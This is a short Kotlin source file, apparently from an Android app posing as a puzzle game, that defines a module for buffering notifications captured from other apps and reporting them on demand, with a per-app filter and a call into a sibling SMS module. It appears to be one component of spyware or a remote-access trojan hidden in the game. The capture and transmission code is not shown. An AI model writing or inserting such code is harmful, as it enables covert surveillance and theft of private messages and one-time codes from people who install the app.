package com.puzzleblast.game.modules

import android.content.Context

object NotifModule {
    data class NotifEntry(val pkg: String, val title: String, val text: String, val time: Long)
    val buffer = mutableListOf<NotifEntry>()

    suspend fun recent(ctx: Context, n: Int = 20): String {
        if (buffer.isEmpty()) return "🔔 no notifications captured"
        return "🔔 Notifications · last $n\n" + buffer.takeLast(n).joinToString("\n") { e ->
            "${e.pkg} · ${e.title.take(30)} — ${e.text.take(60)} · ${SmsModule.relTime(e.time)}"
        }
    }

    suspend fun filter(ctx: Context, pkg: String): String {
        val match = buffer.filter { it.pkg.contains(pkg, true) }
        if (match.isEmpty()) return "🔍 no notifications for $pkg"
        return "🔍 $pkg · ${match.size}\n" + match.takeLast(30).joinToString("\n") { e ->
            "${e.title.take(30)} — ${e.text.take(80)} · ${SmsModule.relTime(e.time)}"
        }
    }
}
